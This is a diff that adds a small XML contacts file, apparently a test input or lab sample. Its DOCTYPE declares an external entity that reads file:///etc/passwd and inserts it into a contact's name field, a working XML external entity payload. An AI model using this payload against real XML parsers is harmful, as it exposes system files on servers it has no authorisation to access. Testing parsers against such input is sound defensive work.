@@ -1,0 +1,7 @@
+<?xml version="1.0"?><!DOCTYPE contacts[<!ENTITY foo SYSTEM "file:///etc/passwd">]>
+<contacts>
+<name>&foo;</name>
+<num>123456</num>
+<name>amgad</name>
+<num>456789</num>
+</contacts>
